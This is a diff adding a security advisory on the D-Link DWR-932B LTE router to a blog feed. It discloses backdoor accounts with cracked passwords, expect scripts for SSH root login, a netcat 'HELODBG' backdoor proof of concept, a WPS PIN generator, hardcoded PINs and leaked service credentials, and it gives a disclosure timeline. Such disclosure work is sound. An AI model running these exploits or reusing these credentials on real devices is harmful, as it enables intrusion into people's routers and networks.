@@ -4,6 +4,450 @@
     <title>A slice of Kimchi - IT Security Blog</title>
     
     <entry>
+        <title>Multiple vulnerabilities found in the Dlink DWR-932B (backdoor, backdoor accounts, weak WPS, RCE ...)</title>
+        <link href="2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html"/>
+        <content type="html"><h2>Product Description</h2>
+<p>Dlink is a multinational networking equipment manufacturing corporation.</p>
+<h2>Vulnerabilities Summary</h2>
+<p>The Dlink DWR-932B is a LTE router / access point overall badly
+designed with a lot of vulnerabilities. It's available in a number of countries to
+provide Internet with a LTE network. It's a model based on the (in)famous <a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html">Quanta LTE router models</a> and inherits some vulnerabilities.</p>
+<p>The tests below are done using the latest available firmware (firmware DWR-932_fw_revB_2_02_eu_en_20150709.zip, model revision B, /Share3/DailyBuild/QDX_DailyBuild/QDT_2031_DLINK/QDT_2031_OS/source/LINUX/apps_proc/oe-core/build/tmp-eglibc/sysroots/x86_64-linux/usr/bin/armv7a-vfp-neon-oe-linux-gnueabi/arm-oe-linux-gnueabi-gcc).</p>
+<p>The summary of the vulnerabilities is:</p>
+<ul>
+<li><a href="#backdoor-accounts">Backdoor accounts</a></li>
+<li><a href="#backdoor">Backdoor</a></li>
+<li><a href="#default-wps-pin">Default WPS PIN</a></li>
+<li><a href="#weak-wps-pin-generation">Weak WPS PIN Generation - with a reverse-engineered algorithm</a></li>
+<li><a href="#leaking-no-ip-account">Leaking No-IP account (?)</a></li>
+<li><a href="#rce-lulz-httpd">Multiple vulnerabilities in the HTTP daemon (qmiweb)</a></li>
+<li><a href="#remote-fota">Remote FOTA (Firmware Over The Air)</a></li>
+<li><a href="#bad-security-practices">Bad security practices</a></li>
+<li><a href="#security-removed-in-upnp">Security removed in UPnP</a></li>
+</ul>
+<p>A personal point of view: at best, the vulnerabilites are due to incompetence; at worst, it is a deliberate act of security sabotage from the vendor. Not all the vulnerabilities found have been disclosed in this advisory. Only the significant ones are shown.</p>
+<p>This router is still on sale.</p>
+<p><strong>Due to lack of security patches provided by the vendor, the vulnerabilities will remain unpatched and customers with questions should contact their local/regional D-Link support office for the latest information.</strong></p>
+<p><a id="backdoor-accounts"></a></p>
+<h2>Details - Backdoor accounts</h2>
+<p>By default, telnetd and SSHd are running in the router.</p>
+<p>Telnetd is running even if there is no documentation about it:</p>
+<pre><code>user@kali:~$ cat ./etc/init.d/start_appmgr
+
+[...]
+#Sandro { for telnetd debug...
+start-stop-daemon -S -b -a /bin/logmaster
+#if [ -e /config2/telnetd ]; then
+        start-stop-daemon -S -b -a /sbin/telnetd
+#fi
+#Sandro }
+[...]
+</code></pre>
+<p>2 backdoor accounts exist and can be used to bypass the HTTP authentication used to manage the router.</p>
+<pre><code>admin@homerouter:~$ grep admin /etc/passwd 
+admin:htEcF9TWn./9Q:168:168:admin:/:/bin/sh
+admin@homerouter:~$
+</code></pre>
+<p>The password for admin is 'admin' and can be found in the <code>/bin/appmgr</code> program using IDA:</p>
+<p><img alt="" src="images/2016-quanta-backdoor-admin-default-mod_sysadm_config_passwd.png" /></p>
+<p>About the root user:</p>
+<pre><code>user@kali:~$ cat ./etc/shadow
+root:aRDiHrJ0OkehM:16270:0:99999:7:::
+daemon:*:16270:0:99999:7:::
+bin:*:16270:0:99999:7:::
+sys:*:16270:0:99999:7:::
+sync:*:16270:0:99999:7:::
+games:*:16270:0:99999:7:::
+man:*:16270:0:99999:7:::
+lp:*:16270:0:99999:7:::
+mail:*:16270:0:99999:7:::
+news:*:16270:0:99999:7:::
+uucp:*:16270:0:99999:7:::
+proxy:*:16270:0:99999:7:::
+www-data:*:16270:0:99999:7:::
+backup:*:16270:0:99999:7:::
+list:*:16270:0:99999:7:::
+irc:*:16270:0:99999:7:::
+gnats:*:16270:0:99999:7:::
+diag:*:16270:0:99999:7:::
+nobody:*:16270:0:99999:7:::
+messagebus:!:16270:0:99999:7:::
+avahi:!:16270:0:99999:7:::
+admin@kali:~$
+</code></pre>
+<p>Using john to crack the hashes:</p>
+<pre><code>user@kali:~$ john -show shadow+passwd
+admin:admin:admin:/:/bin/sh
+root:1234:16270:0:99999:7:::
+
+2 password hashes cracked, 0 left
+user@kali:~$
+</code></pre>
+<p>Results:</p>
+<ul>
+<li>admin has password admin</li>
+<li>root has password 1234</li>
+</ul>
+<p>Working exploit for admin:</p>
+<pre><code>user@kali:~$ cat quanta-ssh-default-password-admin
+#!/usr/bin/expect -f
+
+set timeout 3
+spawn ssh admin@192.168.1.1
+expect "password: $"
+send "admin\r"
+interact
+user@kali:~$ ./quanta-ssh-default-password-admin
+spawn ssh admin@192.168.1.1
+admin@192.168.1.1's password:
+admin@homerouter:~$ id
+uid=168(admin) gid=168(admin) groups=168(admin)
+admin@homerouter:~$
+</code></pre>
+<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin">https://pierrekim.github.io/advisories/quanta-ssh-default-password-admin</a>.</p>
+<p>Working exploit for root:</p>
+<pre><code>user@kali:~$ cat quanta-ssh-default-password-root
+#!/usr/bin/expect -f
+
+set timeout 3
+spawn ssh root@192.168.1.1
+expect "password: $"
+send "1234\r"
+interact
+user@kali:~$ ./quanta-ssh-default-password-root
+spawn ssh root@192.168.1.1
+root@192.168.1.1's password:
+root@homerouter:~# id
+uid=168(root) gid=168(root) groups=168(root)
+root@homerouter:~#
+</code></pre>
+<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/quanta-ssh-default-password-root">https://pierrekim.github.io/advisories/quanta-ssh-default-password-root</a>.</p>
+<p><a id="backdoor"></a></p>
+<h2>Details - Backdoor</h2>
+<p>A backdoor is present inside the <code>/bin/appmgr</code> program. By sending a specific string in UDP to the router, an authentication-less telnet server will start if a telnetd daemon is not already running.</p>
+<p>In <code>/bin/appmgr</code>, a thread listens to 0.0.0.0:39889 (UDP) and waits for commands.</p>
+<p>If a client sends "HELODBG" to the router, the router will execute <code>/sbin/telnetd -l /bin/sh</code>, allowing to access without authentication to the router as root.</p>
+<p>When using IDA, we can see the backdoor is located in the main function (line 369):</p>
+<p><img alt="" src="images/2016-dlink-backdoor-telnet.png" /></p>
+<p>Working PoC :</p>
+<pre><code>user@kali:~$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889
+Hello
+^C
+user@kali:~$ telnet 192.168.1.1
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+
+OpenEmbedded Linux homerouter.cpe
+
+
+msm 20141210 homerouter.cpe
+
+/ # id
+uid=0(root) gid=0(root)
+/ # exit
+Connection closed by foreign host.
+user@kali:~$
+</code></pre>
+<p><a id="default-wps-pin"></a></p>
+<h2>Details - Default WPS PIN</h2>
+<p>Wi-Fi Protected Setup(WPS) is a standard for easy and secure establishment of a wireless home network, as defined in the documentation provided in the router (help.html).</p>
+<p>By default, the PIN for the WPS system is ever <code>28296607</code>. It is, in fact, hardcoded in the <code>/bin/appmgr</code> program:</p>
+<p><img alt="" src="images/2016-dlink-wifi_get_default_wps_pin.png" /></p>
+<p>This PIN can be found in the HostAP configuration too, and, using the information leak, in the HTTP APIs of the router:</p>
+<pre><code>root@homerouter:~# ps -a|grep hostap
+ 1006 root       0:00 hostapd /var/wifi/ar6k0.conf
+ 1219 root       0:00 grep hostap
+root@homerouter:~# cat /var/wifi/ar6k0.conf
+[...]
+ap_pin=28296607
+[...]
+</code></pre>
+<p><a id="weak-wps-pin-generation"></a></p>
+<h2>Details - Weak WPS PIN Generation - with a reverse-engineered algorithm</h2>
+<p>An user can use the webinterface to generate a temporary PIN for the WPS system (low probability as the <code>28296607</code> WPS PIN is provided by default).</p>
+<p>The PIN generated by the router is weak as it is generated using this "strange" reverse-engineered algorithm:</p>
+<pre><code>user@kali:~$ cat quanta-wps-gen.c
+</code></pre>
+<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdio.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdlib.h&gt;</span><span style="color: #BC7A00"></span>
+<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;time.h&gt;</span><span style="color: #BC7A00"></span>
+
+<span style="color: #B00040">int</span> <span style="color: #0000FF">main</span>(<span style="color: #B00040">int</span>    argc,
+         <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>argv,
+         <span style="color: #B00040">char</span>   <span style="color: #666666">**</span>envp)
+{ 
+  <span style="color: #B00040">unsigned</span> <span style="color: #B00040">int</span>  i0, i1;
+  <span style="color: #B00040">int</span>           i2;
+
+  <span style="color: #408080; font-style: italic">/* the seed is the current time of the router, which uses NTP... */</span>
+  srand(time(<span style="color: #666666">0</span>));
+
+  i0 <span style="color: #666666">=</span> rand() <span style="color: #666666">%</span> <span style="color: #666666">10000000</span>;
+  <span style="color: #008000; font-weight: bold">if</span> (i0 <span style="color: #666666">&lt;=</span> <span style="color: #666666">999999</span>)
+    i0 <span style="color: #666666">+=</span> <span style="color: #666666">1000000</span>;
+  i1 <span style="color: #666666">=</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0;
+  i2 <span style="color: #666666">=</span> (<span style="color: #666666">10</span> <span style="color: #666666">-</span> (i1 <span style="color: #666666">/</span> <span style="color: #666666">10000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">1000000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">100</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">3</span> <span style="color: #666666">*</span>
+       (i1 <span style="color: #666666">/</span> <span style="color: #666666">100000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0 <span style="color: #666666">/</span> <span style="color: #666666">10000000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">1000</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> i1 <span style="color: #666666">/</span> <span style="color: #666666">10</span> <span style="color: #666666">%</span> <span style="color: #666666">10</span>))
+        <span style="color: #666666">%</span> <span style="color: #666666">10</span>) <span style="color: #666666">%</span> <span style="color: #666666">10</span> <span style="color: #666666">+</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> i0;
+
+  printf(<span style="color: #BA2121">&quot;%d</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, i2 );
+
+  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
+}
+</pre></div>
+
+<pre><code>user@kali:~$ gcc -o dlink-wps-gen quanta-wps-gen.c
+user@kali:~$ ./dlink-wps-gen
+97329329
+user@kali:~$
+</code></pre>
+<p>You can fetch this program at <a href="https://pierrekim.github.io/advisories/quanta-wps-gen.c">https://pierrekim.github.io/advisories/quanta-wps-gen.c</a>.</p>
+<p>Using <code>srand(time(0))</code> as a seed is a bad idea because an attacker, knowing the current date as <code>time(0)</code> returns the current date in an integer value, can just generate the valid WPS PIN. The Router uses NTP so is likely to have a correct timestamp configured. It's trivial for an attacker to generate valid WPS PIN suites and bruteforce them.</p>
+<p>For the curious reader, the original algorithm in the firmware is:</p>
+<pre><code>.text:0001B4D4                 EXPORT generate_wlan_wps_enrollee_pin
+.text:0001B4D4 generate_wlan_wps_enrollee_pin          ; CODE XREF: wifi_msg_handle+194p
+.text:0001B4D4
+.text:0001B4D4 var_3C          = -0x3C
+.text:0001B4D4 var_38          = -0x38
+.text:0001B4D4 s               = -0x34
+.text:0001B4D4 var_30          = -0x30
+.text:0001B4D4 var_2C          = -0x2C
+.text:0001B4D4
+.text:0001B4D4                 STMFD           SP!, {R4-R11,LR}
+.text:0001B4D8                 SUB             SP, SP, #0x1C
+.text:0001B4DC                 STR             R0, [SP,#0x40+s]
+.text:0001B4E0                 MOV             R0, #0  ; timer
+.text:0001B4E4                 BL              time
+.text:0001B4E8                 BL              srand
+.text:0001B4EC                 BL              rand
+.text:0001B4F0                 LDR             R4, =0x6B5FCA6B
+.text:0001B4F4                 MOV             R6, R0,ASR#31
+.text:0001B4F8                 SMULL           R1, R4, R0, R4
+.text:0001B4FC                 RSB             R10, R6, R4,ASR#22
+.text:0001B500                 RSB             R12, R10, R10,LSL#5
+.text:0001B504                 RSB             R2, R12, R12,LSL#6
+.text:0001B508                 ADD             R11, R10, R2,LSL#3
+.text:0001B50C                 LDR             R8, =0xF423F
+.text:0001B510                 ADD             R9, R11, R11,LSL#2
+.text:0001B514                 SUB             R1, R0, R9,LSL#7
+.text:0001B518                 CMP             R1, R8
+.text:0001B51C                 ADDLS           R1, R1, #0xF4000
+.text:0001B520                 ADDLS           R1, R1, #0x240
+.text:0001B524                 ADD             R3, R1, R1,LSL#2
+.text:0001B528                 MOV             R3, R3,LSL#1
+.text:0001B52C                 LDR             R1, =0xCCCCCCCD
+.text:0001B530                 LDR             R5, =0xA7C5AC5
+.text:0001B534                 LDR             R6, =0x6B5FCA6B
+.text:0001B538                 MOV             R7, R3,LSR#5
+.text:0001B53C                 UMULL           R4, R7, R5, R7
+.text:0001B540                 UMULL           R9, LR, R1, R3
+.text:0001B544                 UMULL           R5, R6, R3, R6
+.text:0001B548                 LDR             R12, =0xD1B71759
+.text:0001B54C                 MOV             R6, R6,LSR#22
+.text:0001B550                 UMULL           R10, R12, R3, R12
+.text:0001B554                 MOV             LR, LR,LSR#3
+.text:0001B558                 UMULL           R10, R9, R1, R6
+.text:0001B55C                 UMULL           R8, R10, R1, LR
+.text:0001B560                 LDR             R0, =0x431BDE83
+.text:0001B564                 MOV             R12, R12,LSR#13
+.text:0001B568                 UMULL           R11, R0, R3, R0
+.text:0001B56C                 STR             R10, [SP,#0x40+var_38]
+.text:0001B570                 UMULL           R8, R10, R1, R12
+.text:0001B574                 LDR             R2, =0x51EB851F
+.text:0001B578                 LDR             R4, =0x10624DD3
+.text:0001B57C                 UMULL           R5, R2, R3, R2
+.text:0001B580                 MOV             R0, R0,LSR#18
+.text:0001B584                 STR             R10, [SP,#0x40+var_3C]
+.text:0001B588                 UMULL           R8, R4, R3, R4
+.text:0001B58C                 UMULL           R8, R10, R1, R0
+.text:0001B590                 MOV             R2, R2,LSR#5
+.text:0001B594                 MOV             R7, R7,LSR#7
+.text:0001B598                 UMULL           R8, R11, R1, R7
+.text:0001B59C                 STR             R10, [SP,#0x40+var_30]
+.text:0001B5A0                 MOV             R4, R4,LSR#6
+.text:0001B5A4                 UMULL           R8, R10, R1, R2
+.text:0001B5A8                 UMULL           R8, R5, R1, R4
+.text:0001B5AC                 STR             R10, [SP,#0x40+var_2C]
+.text:0001B5B0                 MOV             R8, R9,LSR#3
+.text:0001B5B4                 MOV             R10, R11,LSR#3
+.text:0001B5B8                 ADD             R11, R10, R10,LSL#2
+.text:0001B5BC                 ADD             R9, R8, R8,LSL#2
+.text:0001B5C0                 MOV             R10, R5,LSR#3
+.text:0001B5C4                 LDR             R8, [SP,#0x40+var_38]
+.text:0001B5C8                 SUB             R6, R6, R9,LSL#1
+.text:0001B5CC                 SUB             R7, R7, R11,LSL#1
+.text:0001B5D0                 LDR             R9, [SP,#0x40+var_3C]
+.text:0001B5D4                 LDR             R11, [SP,#0x40+var_30]
+.text:0001B5D8                 ADD             R5, R10, R10,LSL#2
+.text:0001B5DC                 SUB             R5, R4, R5,LSL#1
+.text:0001B5E0                 LDR             R4, [SP,#0x40+var_2C]
+.text:0001B5E4                 MOV             R10, R8,LSR#3
+.text:0001B5E8                 MOV             R8, R9,LSR#3
+.text:0001B5EC                 MOV             R9, R11,LSR#3
+.text:0001B5F0                 ADD             R7, R7, R6
+.text:0001B5F4                 ADD             R10, R10, R10,LSL#2
+.text:0001B5F8                 ADD             R9, R9, R9,LSL#2
+.text:0001B5FC                 MOV             R11, R4,LSR#3
+.text:0001B600                 ADD             R8, R8, R8,LSL#2
+.text:0001B604                 ADD             R7, R7, R5
+.text:0001B608                 SUB             LR, LR, R10,LSL#1
+.text:0001B60C                 SUB             R5, R0, R9,LSL#1
+.text:0001B610                 SUB             R8, R12, R8,LSL#1
+.text:0001B614                 ADD             R11, R11, R11,LSL#2
+.text:0001B618                 ADD             R12, R7, LR
+.text:0001B61C                 SUB             R4, R2, R11,LSL#1
+.text:0001B620                 ADD             R8, R8, R5
+.text:0001B624                 ADD             R5, R8, R4
+.text:0001B628                 ADD             R0, R12, R12,LSL#1
+.text:0001B62C                 ADD             R4, R5, R0
+.text:0001B630                 UMULL           R5, R1, R4, R1
+.text:0001B634                 MOV             R2, R1,LSR#3
+.text:0001B638                 ADD             LR, R2, R2,LSL#2
+.text:0001B63C                 SUB             R8, R4, LR,LSL#1
+.text:0001B640                 LDR             R0, =0x66666667
+.text:0001B644                 RSB             R2, R8, #0xA
+.text:0001B648                 SMULL           R8, R0, R2, R0
+.text:0001B64C                 MOV             R12, R2,ASR#31
+.text:0001B650                 RSB             R1, R12, R0,ASR#2
+.text:0001B654                 ADD             LR, R1, R1,LSL#2
+.text:0001B658                 LDR             R12, =(aHostapd_conf_f - 0x1B670)
+.text:0001B65C                 SUB             R4, R2, LR,LSL#1
+.text:0001B660                 LDR             R2, =(aGet_wpspinI - 0x1B67C)
+.text:0001B664                 ADD             R4, R4, R3
+.text:0001B668                 ADD             R0, PC, R12 ; "hostapd_conf_file_gen"
+.text:0001B66C                 ADD             R0, R0, #0x3C
+.text:0001B670                 MOV             R1, #0x3B
+.text:0001B674                 ADD             R2, PC, R2 ; "Get_WpsPin:%in"
+.text:0001B678                 MOV             R3, R4
+.text:0001B67C                 BL              wifi_filelog
+.text:0001B680                 LDR             R1, =(a08lu - 0x1B690)
+.text:0001B684                 LDR             R0, [SP,#0x40+s] ; s
+.text:0001B688                 ADD             R1, PC, R1 ; "%08lu"
+.text:0001B68C                 MOV             R2, R4
+.text:0001B690                 ADD             SP, SP, #0x1C
+.text:0001B694                 LDMFD           SP!, {R4-R11,LR}
+.text:0001B698                 B               sprintf
+.text:0001B698 ; End of function generate_wlan_wps_enrollee_pin
+</code></pre>
+<p><a id="leaking-no-ip-account"></a></p>
+<h2>Details - Leaking No-IP account (?):</h2>
+<p>The file <code>/etc/inadyn-mt.conf</code> (for a dyndns client) contains an user and a hardcoded password:</p>
+<pre><code>--log_file /usr/inadyn_srv.log
+--forced_update_period 6000
+--username alex_hung
+--password 641021
+--dyndns_system default@no-ip.com
+--alias test.no-ip.com
+</code></pre>
+<p><a id="rce-lulz-httpd"></a></p>
+<h2>Details - Multiple vulnerabilities in the HTTP daemon (qmiweb)</h2>
+<p>The HTTP daemon <code>/bin/qmiweb</code> is full of vulnerabilities.</p>
+<p>You can see my precedent researches about a router model using a similar firmware:</p>
+<ul>
+<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#webinterface-information-leak">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#webinterface-information-leak</a></li>
+<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-1">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-1</a></li>
+<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-2">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#rce-2</a></li>
+<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-browsing-using-the-http-daemon">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-browsing-using-the-http-daemon</a></li>
+<li><a href="https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-reading-using-the-http-daemon">https://pierrekim.github.io/blog/2016-04-04-quanta-lte-routers-vulnerabilities.html#arbitrary-file-reading-using-the-http-daemon</a></li>
+</ul>
+<p>Adapting the exploits is left as exercises for the reader :)</p>
+<p><a id="remote-fota"></a></p>
+<h2>Details - Remote FOTA (Firmware Over The Air)</h2>
+<p>The credentials to contact the FOTA server are hardcoded in the <code>/sbin/fotad</code> binary, as shown with this IDA screenshot:</p>
+<p><img alt="" src="images/2016-dlink-sbin-fota-http-req.png" /></p>
+<p>The function sub_CAAC contains the credentials as base64-strings, used to retrieve the firmware.</p>
+<p>It's notable the FOTA daemon tries to retrieve the firmware over HTTPS. But at the date of the writing,
+the SSL certificate for <a href="https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml">https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml</a> is invalid for 1.5 year.</p>
+<p><img alt="" src="images/2016-dlink-sbin-fota-http-req-auth-passwords.png" /></p>
+<p>The user/password combinations are:</p>
+<pre><code>qdpc:qdpc
+qdpe:qdpe
+qdp:qdp
+</code></pre>
+<p><a id="bad-security-practices"></a></p>
+<h2>Details - Bad security practices:</h2>
+<p>From <code>/etc/init.d/start_appmgr</code>, you will read "strange" shell commands executed as root, like:</p>
+<pre><code>if [  -f /sbin/netcfg ]; then
+        echo -n "chmod 777 netcfg"
+        chmod 777 /sbin/netcfg
+fi
+if [  -f /bin/QNetCfg ]; then
+        echo -n "chmod 777 QNetCfg"
+        chmod 777 /bin/QNetCfg
+fi
+</code></pre>
+<p>I have no idea why the vendor needs to chmod 777 files located in /bin/.</p>
+<p><a id="security-removed-in-upnp"></a></p>
+<h2>Details - Security removed in UPnP</h2>
+<p>UPnP allows to add firewall rules dynamically. Because of the security risks involved, generally there are restrictions in place to avoid dangerous new firewall rules from an unstrusted LAN client.</p>
+<p>Insecurity in IPnP was hype 10 years ago (in 2006). The security level of the UPNP program (miniupnp) in this router is volountarily lowered as shown below and allows an attacker located in the LAN area to add Port forwarding from the Internet to other clients located in the LAN:</p>
+<p>The /var/miniupnpd.conf is generated by the <code>/bin/appmgr</code> program:</p>
+<p><img alt="" src="images/2016-dlink-appmgr-sub_2AE0C.png" /></p>
+<p>It will generate the <code>/var/miniupnpd.conf</code> file:</p>
+<pre><code>ext_ifname=rmnet0
+listening_ip=bridge0
+port=2869
+enable_natpmp=yes
+enable_upnp=yes
+bitrate_up=14000000
+bitrate_down=14000000
+secure_mode=no      # "secure" mode : when enabled, UPnP client are allowed to add mappings only to their IP.
+presentation_url=http://192.168.1.1
+system_uptime=yes
+notify_interval=30
+upnp_forward_chain=MINIUPNPD
+upnp_nat_chain=MINIUPNPD
+</code></pre>
+<p>There is no restriction about the UPnP permission rules in the configuration file, contrary to common usage in UPnP where it is advised to only allow redirection of port above 1024:</p>
+<p>Normal config file:</p>
+<pre><code># UPnP permission rules
+# (allow|deny) (external port range) ip/mask (internal port range)
+# A port range is &lt;min port&gt;-&lt;max port&gt; or &lt;port&gt; if there is only
+# one port in the range.
+# ip/mask format must be nn.nn.nn.nn/nn
+# it is advised to only allow redirection of port above 1024
+# and to finish the rule set with "deny 0-65535 0.0.0.0/0 0-65535"
+allow 1024-65535 192.168.0.0/24 1024-65535
+deny 0-65535 0.0.0.0/0 0-65535
+</code></pre>
+<p>In the configuration of the vulnerable router where there are no permission rules, an attacker can forward everything from the WAN into the LAN. For example, an attacker can add a forwarding rule in order to allow traffic from the Internet to local Exchange servers, mail servers, ftp servers, http servers, database servers... In fact, this lack of security allows a local user to forward whatever they want from the Internet into the LAN.</p>
+<h2>Personal notes</h2>
+<p>As the router has a sizable memory (168 MB), a decent CPU and good free space (235 MB) with complete toolkits installed by default (sshd, proxy (<code>/bin/tinyproxy -c /var/tproxy.conf</code>), tcpdump ...), I advise users to trash their routers because it's trivial for an attacker to use this router as an attack vector (ie: hosting a sniffing tool, LAN hacking, active MiTM tool, spamming zombie).</p>
+<p>From my tests, it is possible to overwrite the firmware with a custom (backdoored) firmware. Generating a valid backdoored firmware is left as an exercise for the reader, but with all these vulnerabilities present in the default firmware, I don't think it is worth making the effort.</p>
+<h2>Vendor Response</h2>
+<p>Customers with questions should contact their local/regional D-Link support offices for the latest information.</p>
+<h2>Report Timeline</h2>
+<ul>
+<li>Dec 04, 2015: Vulnerabilities found by Pierre Kim in Quanta routers.</li>
+<li>Apr 04, 2016: A public advisory about Quanta routers is sent to security mailing lists.</li>
+<li>Jun 09, 2016: Pierre Kim is contacted by Gianni Carabelli about Dlink DWR-932 router's similarities to Quanta routers.</li>
+<li>Jun 14, 2016: Pierre Kim thanks Gianni Carabelli and says he will contact Dlink.</li>
+<li>Jun 15, 2016: Dlink is contacted about vulnerabilities in the DWR-932 router (=~ 20 vulns).</li>
+<li>Jun 16, 2016: Dlink Security Incident Response Team (William Brown) acknowledges the receipt of the report and says they will provide further updates.</li>
+<li>Jul 09, 2016: Pierre asks for updates.</li>
+<li>Jul 09, 2016: Dlink says they will have correction by July 15.</li>
+<li>Jul 19, 2016: Pierre asks for updates.</li>
+<li>Aug 19, 2016: Pierre asks for updates.</li>
+<li>Sep 12, 2016: Pierre asks for updates and says he will soon release an advisory as 90 days have passed without news.</li>
+<li>Sep 12, 2016: cert@cert.org is contacted to get pieces of advice about the disclosure.</li>
+<li>Sep 13, 2016: CERT recommends to try to contact D-link and to publish the advisory.</li>
+<li>Sep 13, 2016: Dlinks says they don't have a schedule for a firmware release. Customers who have questions should contact their local/regional D-Link support offices for the latest information. <a href="http://support.dlink.com">support.dlink.com</a> will be updated in the next 24 hours.</li>
+<li>Sep 28, 2016: A public advisory is sent to security mailing lists.</li>
+</ul>
+<h2>Credits</h2>
+<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
+<p>I would like to thank <a href="https://www.linkedin.com/pulse/rooting-dlink-dwr-923-4g-router-gianni-carabelli">Gianni Carabelli</a> who found this router and thought it was very similar to the previous backdoored Quanta routers.</p>
+<h2>References</h2>
+<p><a href="https://pierrekim.github.io/advisories/2016-dlink-0x00.txt">https://pierrekim.github.io/advisories/2016-dlink-0x00.txt</a></p>
+<p><a href="https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html">https://pierrekim.github.io/blog/2016-09-28-dlink-dwr-932b-lte-routers-vulnerabilities.html</a></p>
+<p><a href="https://www.linkedin.com/pulse/rooting-dlink-dwr-923-4g-router-gianni-carabelli">https://www.linkedin.com/pulse/rooting-dlink-dwr-923-4g-router-gianni-carabelli</a></p>
+<h2>Disclaimer</h2>
+<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
+    </entry>
+    
+    <entry>
         <title>Multiple vulnerabilities found in Quanta LTE routers (backdoor, backdoor accounts, RCE, weak WPS ...)</title>
         <link href="2016-04-04-quanta-lte-routers-vulnerabilities.html"/>
         <content type="html"><h2>Product Description</h2>
